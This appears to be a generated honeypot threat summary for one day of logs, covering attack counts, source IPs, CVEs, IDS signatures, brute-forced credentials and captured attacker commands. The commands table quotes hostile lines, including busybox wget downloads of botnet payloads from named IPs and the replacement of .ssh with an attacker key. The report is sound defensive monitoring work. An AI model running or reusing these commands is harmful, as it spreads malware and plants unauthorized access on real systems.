# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T18-46-46Z
**Timeframe:** 2025-09-29T14:02:04Z to 2025-09-29T18:43:06Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-09-29T14-02-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T14:58:05Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:02:30Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T15:42:56Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T16:02:15Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T17:20:43Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T18:43:06Z.md

## Executive Summary

This report provides a comprehensive analysis of malicious activities targeting our honeypot network over the last five hours. A total of **78,230** attacks were recorded across our distributed honeypots. The **Cowrie** honeypot, simulating SSH and Telnet services, captured the highest volume of attacks, closely followed by the **Suricata** IDS, which detected a significant number of network-based attacks.

The most aggressive attacks originated from a diverse range of IP addresses, with a notable concentration from a few specific sources. The most prominent attacking IP address was **134.199.202.5**, which is registered to the University of Scranton and has been recently reported for malicious activities. Another significant attacker, **39.107.106.103**, is associated with Hangzhou Alibaba Advertising Co., Ltd. in China.

The most frequently targeted services were **SSH (port 22)** and **SMB (port 445)**. The high number of alerts for the **DoublePulsar backdoor** associated with SMB traffic suggests a widespread campaign targeting this vulnerability.

A wide array of CVEs were observed, with **CVE-2021-44228 (Log4Shell)** being the most persistently targeted vulnerability. This indicates that attackers are still actively exploiting this critical remote code execution vulnerability.

Attackers were observed employing a variety of tactics, including brute-force login attempts with common credentials, and the execution of post-exploitation commands. These commands were primarily aimed at system reconnaissance, establishing persistence through SSH key manipulation, and downloading and executing malicious payloads. The repeated attempts to download and execute files such as `w.sh`, `c.sh`, and `arm.urbotnetisass` are indicative of a coordinated botnet campaign targeting multiple architectures.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP    | Public IP       |
|----------|---------------|-----------------|
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot

| Honeypot        | Attack Count |
|-----------------|--------------|
| Cowrie          | 27296        |
| Suricata        | 12752        |
| Honeytrap       | 12220        |
| Ciscoasa        | 8649         |
| Dionaea         | 2034         |
| Mailoney        | 1008         |
| Redishoneypot   | 313          |
| Adbhoney        | 218          |
| Sentrypeer      | 181          |
| Tanner          | 181          |
| H0neytr4p       | 171          |
| ConPot          | 165          |
| ElasticPot      | 86           |
| Dicompot        | 63           |
| ssh-rsa         | 18           |
| Ipphoney        | 25           |
| Honeyaml        | 28           |
| Heralding       | 25           |
| Miniprint       | 28           |

### Top Source Countries

*No data available in logs.*

### Top Attacking IPs

| IP Address        | Attack Count | OSINT Information                                                              |
|-------------------|--------------|--------------------------------------------------------------------------------|
| 134.199.202.5     | 2173         | Registered to the University of Scranton. Flagged in recently reported IPs on AbuseIPDB. |
| 181.115.175.122   | 1405         | No public abuse report found.                                                  |
| 39.107.106.103    | 1270         | Associated with Hangzhou Alibaba Advertising Co., Ltd. in China. Appears on blocklists. |
| 121.52.153.77     | 1492         | No public abuse report found.                                                  |
| 45.78.224.98      | 749          | *Not investigated*                                                             |
| 4.247.148.24      | 933          | *Not investigated*                                                             |
| 185.156.73.166    | 1864         | *Not investigated*                                                             |
| 185.156.73.167    | 1861         | *Not investigated*                                                             |
| 92.63.197.55      | 1792         | *Not investigated*                                                             |
| 92.63.197.59      | 1675         | *Not investigated*                                                             |

### Top Targeted Ports/Protocols

| Port      | Attack Count |
|-----------|--------------|
| 22        | 3300         |
| 445       | 2257         |
| TCP/445   | 1537         |
| 8333      | 425          |
| 25        | 929          |
| 23        | 243          |
| 1433      | 88           |
| TCP/1433  | 67           |
| 6379      | 231          |
| 80        | 167          |
| TCP/80    | 94           |
| 443       | 114          |

### Most Common CVEs

- CVE-2021-44228 (Log4Shell)
- CVE-2019-11500
- CVE-2021-3449
- CVE-2002-0013
- CVE-2002-0012
- CVE-2005-4050
- CVE-2016-20016
- CVE-1999-0517
- CVE-2018-11776
- CVE-2006-2369
- CVE-2024-3721
- CVE-1999-0183
- CVE-2019-16920
- CVE-2024-12856
- CVE-2024-12885
- CVE-2014-6271
- CVE-2023-52163
- CVE-2023-31983
- CVE-2023-47565
- CVE-2024-10914
- CVE-2009-2765
- CVE-2015-2051
- CVE-2024-33112
- CVE-2022-37056
- CVE-2019-10891
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542
- CVE-2021-42013
- CVE-2001-0414
- CVE-2020-2551
- CVE-1999-0265

### Commands Attempted by Attackers

| Command                                                                 | Count |
|-------------------------------------------------------------------------|-------|
| `uname -a`                                                              | 68    |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                  | 60    |
| `lockr -ia .ssh`                                                        | 60    |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`                  | 60    |
| `cat /proc/cpuinfo | grep name | wc -l`                                 | 61    |
| `uname -s -v -n -r -m`                                                  | 10    |
| `whoami`                                                                | 60    |
| `lscpu | grep Model`                                                    | 60    |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`                         | 60    |
| `Enter new UNIX password:`                                              | 41    |
| `rm -rf /data/local/tmp/*`                                              | 4     |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` | 3     |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; ...`      | 1     |
| `cd /data/local/tmp/; busybox wget http://161.97.149.138/w.sh; ...`        | 2     |
| `echo -e "..."|passwd|bash`                                             | 1     |

### Signatures Triggered

- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- GPL INFO SOCKS Proxy attempt
- ET INFO CURL User Agent
- ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET CINS Active Threat Intelligence Poor Reputation IP
- ET EXPLOIT Apache Obfuscated log4j RCE Attempt (tcp ldap) (CVE-2021-44228)
- ET SCAN Potential SSH Scan

### Users / Login Attempts

| Username/Password         |
|---------------------------|
| 345gs5662d34/345gs5662d34  |
| root/nPSpP4PBW0           |
| root/redhat               |
| postgres/postgres         |
| root/Zy123456789          |
| root/1                    |
| root/Passw0rd             |
| test/test                 |
| hive/hive                 |
| tom/tom                   |
| appuser/appuser           |
| esuser/esuser             |
| flask/flask               |
| root/3245gs5662d34        |
| root/root123              |
| minecraft/minecraft       |
| ubuntu/1qazxsw2           |
| www/abc123                |
| root/qwerty123            |
| test/abc123               |
| seekcy/Joysuch@Locate2022 |
| foundry/foundry           |
| test/zhbjETuyMffoL8F      |

### Files Uploaded/Downloaded

- wget.sh
- w.sh
- c.sh
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- Mozi.m%20dlink.mips%27$
- rondo.dgx.sh
- apply.cgi
- k.php?a=x86_64,3V74AX6926R6GH83H

### HTTP User-Agents

*No data available in logs.*

### SSH Clients and Servers

*No data available in logs.*

### Top Attacker AS Organizations

*No data available in logs.*

## Google Searches
- AbuseIPDB report for 134.199.202.5
- AbuseIPDB report for 181.115.175.122
- AbuseIPDB report for 39.107.106.103
- AbuseIPDB report for 121.52.153.77

## Key Observations and Anomalies

- **Botnet Activity:** The consistent attempts to download and execute shell scripts and binaries with names like `w.sh`, `c.sh`, and `arm.urbotnetisass` from multiple IP addresses suggest a coordinated botnet campaign. The targeting of various architectures (ARM, x86, MIPS) indicates a sophisticated and widespread operation.
- **Reconnaissance and Persistence:** A significant portion of the commands executed by attackers are focused on system reconnaissance (`uname`, `lscpu`, `free`, `df`). This is often followed by attempts to establish persistence by modifying the `.ssh/authorized_keys` file.
- **Targeting of SMB:** The high volume of traffic to port 445 and the frequent triggering of the DoublePulsar backdoor signature highlight the continued threat of SMB-based attacks.
- **Log4Shell Exploitation:** The persistent attempts to exploit CVE-2021-44228 (Log4Shell) demonstrate that this vulnerability remains a primary target for attackers.
- **Automated Attacks:** The high frequency of attacks, the use of common credential lists, and the repetitive nature of the commands strongly suggest that the vast majority of these attacks are automated.
- **Suspicious IP Sources:** The fact that a significant number of attacks originate from an IP address registered to a university (University of Scranton) is a notable anomaly. This could indicate a compromised system within the university's network being used as a vector for attacks. Similarly, the association of another top attacker with a Chinese advertising company is also a point of interest.
